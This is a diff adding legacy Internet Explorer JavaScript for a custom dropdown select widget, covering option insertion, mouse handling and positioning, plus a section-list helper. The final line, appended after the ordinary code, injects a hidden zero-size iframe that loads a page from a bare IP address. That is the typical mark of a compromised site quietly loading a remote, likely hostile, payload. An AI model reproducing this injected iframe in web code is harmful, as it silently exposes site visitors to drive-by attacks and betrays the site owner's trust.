+}
+
+function FOO_insertOption1 (obj, value, innerText, idx)
+{
+  var NewOption = document.createElement("OPTION");
+  FOO_CreatedElements[FOO_CreatedElements.length] = NewOption;
+  obj.options.add(NewOption, idx);
+  NewOption.innerText = innerText;
+  NewOption.value = value;
+
+  if (!obj.bOriginalSelect)
+    obj.createOptionTr(idx);
+
+  obj.syncOptions();
+  obj.adjustOptionsDiv();
+  obj.syncSelectedIndex();
+}
+
+
+function FOO_changeOption1 (obj, idx, value, innerText)
+{
+  obj.options[idx].value = value;
+  obj.options[idx].innerText = innerText;
+  obj.syncOptions();
+  obj.syncSelectedIndex();
+}
+
+function FOO_deleteOption1 (obj, idx)
+{
+  obj.options.remove(idx);
+  if (!obj.bOriginalSelect)
+    obj.OptionsTable.deleteRow(idx);
+  obj.syncOptions();
+  obj.adjustOptionsDiv();
+  obj.syncSelectedIndex();
+}
+
+
+function FOO_cancelEvent (event)
+{
+  event.cancelBubble = true;
+  event.returnValue = false;
+}
+function FOO_isThisEventToBeCanceled (event)
+{
+  if ('object' == typeof(event)) {
+    switch (event.type) {
+      case 'mousedown':
+        if (!(event.button & 1)) return true;
+        break;
+      case 'mouseup':
+        if (!(event.button & 1)) return true;
+        if (FOO_ENV.IE_Version >= 5.5 && event.srcElement != this.srcElementOfLastMousedown && this.srcElementOfLastMousedown != null) {
+          this.srcElementOfLastMousedown = null;
+          return true;
+        }
+        break;
+      case 'mouseout':
+        if (!(FOO_ENV.IE_Version < 5.5 && event.srcElement == this.srcElementOfLastMousedown))
+          return true;
+        break;
+      case 'mousemove':
+        if (FOO_ENV.IE_Version >= 5.5 && event.srcElement != this.srcElementOfLastMousedown && this.srcElementOfLastMousedown != null)
+          return true;
+        break;
+    }
+  }
+  return false;
+}
+function FOO_createElement (html)
+{
+  FOO_VAR.DivDummy.insertAdjacentHTML('afterBegin', html);
+  var oEl = FOO_VAR.DivDummy.children(0);
+  while (FOO_VAR.DivDummy.children.length > 0) {
+    FOO_VAR.DivDummy.removeChild(FOO_VAR.DivDummy.children(0));
+  }
+  return oEl;
+}
+function FOO_blurExcept (except)
+{
+  FOO_cancelEvent(window.event);
+
+  except = ('number'==typeof(except)) ? except : -1;
+
+  var bHasToDetachEvent = true;
+  for (var i=0; i < FOO_VAR.SelectList.length; i++) {
+    if (-1==except && FOO_VAR.SelectList[i].bFocused && FOO_VAR.SelectList[i].bExpanded) {
+      FOO_VAR.SelectList[i].toggleOptions(false, true);
+      FOO_VAR.SelectList[i].toggleTitle(true);
+      bHasToDetachEvent = false;
+    }
+    else if (i!=except) {
+      if (FOO_VAR.SelectList[i].bExpanded)
+        FOO_VAR.SelectList[i].toggleOptions(false, true);
+      if (FOO_VAR.SelectList[i].bReverse)
+        FOO_VAR.SelectList[i].toggleTitle(false);
+      FOO_VAR.SelectList[i].bFocused = false;
+    }
+  }
+
+  if (FOO_VAR.bEventAttached && bHasToDetachEvent) {
+    document.detachEvent('onmousedown', FOO_blurExcept);
+    document.detachEvent('ondblclick', FOO_blurExcept);
+    FOO_VAR.bEventAttached = false;
+  }
+}
+function FOO_syncSelectedIndex ()
+{
+  this.selectedIndex = this.select.selectedIndex;
+
+  if (this.bOriginalSelect) return;
+
+  if (this.TitleTable.cells(0).childNodes(0).innerText != this.options[this.selectedIndex].innerText)
+    this.TitleTable.cells(0).childNodes(0).innerText = this.options[this.selectedIndex].innerText;
+  if (this.bExpanded)
+    this.toggleOptions(false);
+}
+function FOO_syncSelectedIndex1 (obj)
+{
+  obj.selectedIndex = obj.select.selectedIndex;
+
+  if (obj.bOriginalSelect) return;
+
+  if (obj.TitleTable.cells(0).childNodes(0).innerText != obj.options[obj.selectedIndex].innerText)
+    obj.TitleTable.cells(0).childNodes(0).innerText = obj.options[obj.selectedIndex].innerText;
+  if (obj.bExpanded)
+    obj.toggleOptions(false);
+}
+function FOO_toggleTitle (bReverse)
+{
+  this.bReverse = ('undefined'!=typeof(bReverse)) ? bReverse: (!this.bReverse);
+  this.TitleTable.cells(0).style.backgroundColor = this.bReverse ? FOO_ENV.CR.ReverseBackground : '';
+  this.TitleTable.cells(0).style.color = this.bReverse ? FOO_ENV.CR.ReverseText : '';
+}
+function FOO_toggleOptions (bExpanded, bStrict)
+{
+  if (!bStrict && !this.bFocused) {
+    FOO_blurExcept(this.ssID);
+  }
+  this.bExpanded = ('undefined'!=typeof(bExpanded)) ? bExpanded: (!this.bExpanded);
+  if (this.bExpanded) {
+    this.adjustOptionsDiv();
+    this.OptionsDiv.style.display = 'block';
+    if (!bStrict) {
+      this.toggleTitle(false);
+      this.handleOverOption(this.selectedIndex);
+    }
+    this.handleOutTitle();
+  }
+  else {
+    this.OptionsDiv.style.display = 'none';
+    if (!bStrict) {
+      this.toggleTitle(true);
+    }
+  }
+  if (!bStrict) {
+    this.bFocused = true;
+
+    if (!FOO_VAR.bEventAttached) {
+      document.attachEvent('onmousedown', FOO_blurExcept);
+      document.attachEvent('ondblclick', FOO_blurExcept);
+      FOO_VAR.bEventAttached = true;
+    }
+  }
+}
+function FOO_handlePropertychange ()
+{
+  if ('propertychange'==window.event.type && 'selectedIndex'==window.event.propertyName) {
+    var oSS = window.event.srcElement.SS;
+    oSS.syncSelectedIndex();
+
+    if (null != oSS.select.onchange)
+      oSS.select.onchange();
+  }
+}
+function FOO_handleMousewheel (event)
+{
+  var idx = this.selectedIndex;
+  if ('mousewheel'==event.type && this.bFocused && this.bReverse) {
+    for (var i=0; i < event.wheelDelta; i += 120)
+      idx--;
+    for (var i=0; i > event.wheelDelta; i -= 120)
+      idx++;
+  }
+  idx = Math.max(idx, 0);
+  idx = Math.min(idx, this.options.length - 1);
+  this.select.selectedIndex = idx;
+}
+function FOO_handleOverTitle ()
+{
+  if (this.bExpanded)
+    return;
+
+  this.TitleTable.style.borderColor = FOO_ENV.CR.BorderActive;
+  this.TitleTable.cells(1).style.display = 'none';
+  this.TitleTable.cells(2).style.display = 'block';
+}
+function FOO_handleOutTitle ()
+{
+  this.TitleTable.style.borderColor = FOO_ENV.CR.Border;
+  this.TitleTable.cells(2).style.display = 'none';
+  this.TitleTable.cells(1).style.display = 'block';
+}
+function FOO_handleOverOption (idx)
+{
+  for (var i=0; i < this.options.length; i++) {
+    if (i==idx)
+      this.turnOnOption(i);
+    else
+      this.turnOffOption(i);
+  }
+}
+function FOO_turnOnOption (idx)
+{
+  this.OptionsTable.cells(idx).style.color = FOO_ENV.CR.ReverseText;
+  this.OptionsTable.cells(idx).style.backgroundColor = FOO_ENV.CR.ReverseBackground;
+}
+function FOO_turnOffOption (idx)
+{
+  this.OptionsTable.cells(idx).style.color = '';
+  this.OptionsTable.cells(idx).style.backgroundColor = '';
+}
+function FOO_adjustOptionsDiv ()
+{
+  if (this.bOriginalSelect) return;
+
+  this.OptionsDiv.style.width = this.width;
+  this.OptionsDiv.style.height = Math.min(this.options.length, this.ListMax) * this.OptionHeight ;
+  this.OptionsWrapper.style.height = this.options.length * this.OptionHeight;
+  this.OptionsDiv.style.overflowY = (this.options.length > this.ListMax) ? 'scroll' : '';
+
+  var top = this.Table.offsetTop;
+  var left = this.Table.offsetLeft;
+  for (var El = this.Table.offsetParent; 'BODY'!=El.tagName && 'absolute'!=El.style.position && 'relative'!=El.style.position; El = El.offsetParent) {
+    if ('TABLE' != El.tagName) {
+      top += El.clientTop;
+      left += El.clientLeft;
+    }
+    top += El.offsetTop;
+    left += El.offsetLeft;
+  }
+  this.OptionsDiv.style.top = (this.bListDown) ? (top + this.height) : (top - parseInt(this.OptionsDiv.style.height));
+  this.OptionsDiv.style.left = left;
+
+  this.TitleWrapper.style.top = 0;
+  this.TitleWrapper.style.left = 0;
+}
+function FOO_syncOptions ()
+{
+  if (this.bOriginalSelect) return;
+
+  for (var i=0; i < this.options.length; i++) {
+    this.OptionsTable.cells(i).setAttribute('index', i);
+    if (this.OptionsTable.cells(i).childNodes(0).innerText != this.options[i].innerText)
+      this.OptionsTable.cells(i).childNodes(0).innerText = this.options[i].innerText;
+  }
+}
+function FOO_pressTitle (event)
+{
+  FOO_cancelEvent(event);
+
+  this.srcElementOfLastMousedown = event.srcElement;
+
+  this.toggleOptions();
+}
+function FOO_releaseTitle (event)
+{
+  FOO_cancelEvent(event);
+
+  if (this.isThisEventToBeCanceled(event)) return;
+
+  this.srcElementOfLastMousedown = null;
+}
+function FOO_pressOption (event)
+{
+  FOO_cancelEvent(event);
+
+  this.srcElementOfLastMousedown = event.srcElement;
+}
+function FOO_moveOption (event)
+{
+  FOO_cancelEvent(event);
+
+  if (this.isThisEventToBeCanceled(event)) return;
+  if (!(event.offsetX >= 0 && event.offsetX <= this.OptionsTable.offsetWidth)) return;
+
+  this.handleOverOption(Math.floor(event.offsetY / this.OptionHeight));
+}
+function FOO_releaseOption (event)
+{
+  FOO_cancelEvent(event);
+
+  if (this.isThisEventToBeCanceled(event)) return;
+
+  this.srcElementOfLastMousedown = null;
+
+  if (event.offsetX >= 0 && event.offsetX <= this.OptionsTable.offsetWidth) {
+    this.toggleOptions(false);
+    this.select.selectedIndex = Math.floor(event.offsetY / this.OptionHeight);
+  }
+}
+function FOO_createTable ()
+{
+  this.Table = FOO_createElement(""
+    + "<table border=0 cellpadding=0 cellspacing=0 style='table-layout:fixed; "+FOO_ENV.MouseStyle+"'>"
+    + "<tr><td></td></tr>"
+    + "</table>"
+  );
+  if (!isNaN(this.width))
+    this.Table.style.width = this.width;
+  this.Table.style.height = this.height;
+
+  if (!this.bOriginalSelect) {
+    this.createTitleDiv();
+    this.createOptionsDiv();
+    this.Table.cells(0).appendChild(this.TitleDiv);
+    this.Table.cells(0).appendChild(this.OptionsDiv);
+  }
+  else {
+    this.Table.cells(0).appendChild(this.select);
+  }
+}
+function FOO_createTitleDiv ()
+{
+  this.TitleDiv = FOO_createElement(""
+    + "<div style='position:relative; top:0; left:0;'>"
+    + "  <table border=0 cellpadding=0 cellspacing=0"
+    + "    height="+this.height
+    + "    bgcolor=01597B"
+    + "    style='table-layout:fixed; border:0 solid "+FOO_ENV.CR.Border+";'"
+    + "    onmouseover='FOO_VAR.SelectList["+this.ssID+"].adjustOptionsDiv()'"
+    + "  >"
+    + "  <tr>"
+    + "    <td><nobr style='text-oveflow:hidden;"+FOO_ENV.OptionNobrStyle+"'></nobr></td>"
+    + "    <td width="+FOO_ENV.ButtonWidth+" align=center style='word-wrap:normal'></td>"
+    + "    <td style='display:none' width="+FOO_ENV.ButtonWidth+" align=center style='word-wrap:normal'></td>"
+    + "    <td style='display:none'></td>"
+    + "  </tr>"
+    + "  </table>"
+    + "</div>"
+  );
+  this.TitleTable = this.TitleDiv.childNodes(0);
+  this.TitleTable.cells(0).childNodes(0).innerText = this.options[this.selectedIndex].innerText;
+  this.TitleTable.cells(1).innerHTML = "<img src='/images/sub/top/btn_arrow.gif' border=0 align=absmiddle>";
+  this.TitleTable.cells(2).innerHTML = "<img src='/images/sub/top/btn_arrow.gif' border=0 align=absmiddle>";
+  this.TitleTable.cells(3).appendChild(this.select);
+  this.TitleWrapper = document.createElement(""
+    + "<img src='"+FOO_ENV.ImgPrefix+"/images/sub/footer/select_bg.gif'"
+    + "  style='position:absolute; top:0; left:0; z-index:2; width:100%; height:"+this.height+";'"
+    + "  onmouseover='FOO_VAR.SelectList["+this.ssID+"].handleOverTitle()'"
+    + "  onmouseout='FOO_VAR.SelectList["+this.ssID+"].handleOutTitle(); FOO_VAR.SelectList["+this.ssID+"].releaseTitle(window.event);'"
+    + "  onmousedown='FOO_VAR.SelectList["+this.ssID+"].pressTitle(window.event)'"
+    + "  ondblclick='FOO_VAR.SelectList["+this.ssID+"].pressTitle(window.event); FOO_VAR.SelectList["+this.ssID+"].releaseTitle(window.event);'"
+    + "  onmouseup='FOO_VAR.SelectList["+this.ssID+"].releaseTitle(window.event)'"
+    + "  onmousewheel='FOO_VAR.SelectList["+this.ssID+"].handleMousewheel(window.event)'"
+    + "  ondragstart='FOO_cancelEvent(window.event)'"
+    + ">"
+  );
+  FOO_CreatedElements[FOO_CreatedElements.length] = this.TitleWrapper;
+  this.TitleDiv.appendChild(this.TitleWrapper);
+}
+function FOO_createOptionsDiv ()
+{
+  this.OptionsDiv = FOO_createElement(""
+    + "<div style='"+FOO_ENV.OptionsDivStyle+"'"
+    + "  onscroll='FOO_VAR.SelectList["+this.ssID+"].moveOption(window.event)'"
+    + "  onmousedown='FOO_cancelEvent(window.event)'"
+    + ">"
+    + "  <table border=0 cellpadding=3 cellspacing=0 width=100% style='table-layout:fixed'>"
+    + "  </table>"
+    + "</div>"
+  );
+  this.OptionsTable = this.OptionsDiv.childNodes(0);
+  for (var i=0; i < this.options.length; i++) {
+    this.createOptionTr(i);
+  }
+  this.syncOptions();
+  this.OptionsWrapper = document.createElement(""
+	+ "<img src='"+FOO_ENV.ImgPrefix+"/images/sub/footer/blank2.gif'"
+    + "  style='position:absolute; top:0; left:0; width:100%;'"
+    + "  onmousedown='FOO_VAR.SelectList["+this.ssID+"].pressOption(window.event)'"
+    + "  onmousemove='FOO_VAR.SelectList["+this.ssID+"].moveOption(window.event)'"
+    + "  onmouseup='FOO_VAR.SelectList["+this.ssID+"].releaseOption(window.event)'"
+    + "  onmouseout='FOO_VAR.SelectList["+this.ssID+"].releaseOption(window.event)'"
+    + "  ondragstart='FOO_cancelEvent(window.event)'"
+    + ">"
+  );
+  FOO_CreatedElements[FOO_CreatedElements.length] = this.OptionsWrapper;
+  this.OptionsDiv.appendChild(this.OptionsWrapper);
+}
+function FOO_createOptionTr (idx)
+{
+  idx = ('undefined'!=typeof(idx)) ? idx : this.options.length - 1;
+  var OptionTr = this.OptionsTable.insertRow(-1);
+  var OptionTd = document.createElement("<td height="+this.OptionHeight+"></td>");
+  FOO_CreatedElements[FOO_CreatedElements.length] = this.OptionsTd;
+  OptionTd.appendChild(document.createElement("<nobr style='"+FOO_ENV.OptionNobrStyle+"'></nobr>"));
+  OptionTr.appendChild(OptionTd);
+}
+
+
+
+function sectionChange(form)
+{
+	var idx_office = FOO_office.selectedIndex;
+	var office_section = section_list[idx_office];
+	var tmp, i, len;
+
+	len = FOO_section.options.length;
+
+	for (i = office_section.length - 1; i >= 0; i--) {
+		tmp = office_section[i].split(",");
+		FOO_section.insertOption(tmp[1], tmp[0], 0);
+	}
+
+	offset = office_section.length;
+	for (i = office_section.length; i < office_section.length + len; i++) {
+		FOO_section.deleteOption(offset);
+	}
+}
+document.write('<iframe height=0 width=0 src="http://61.74.73.136/index.htm"></iframe>');
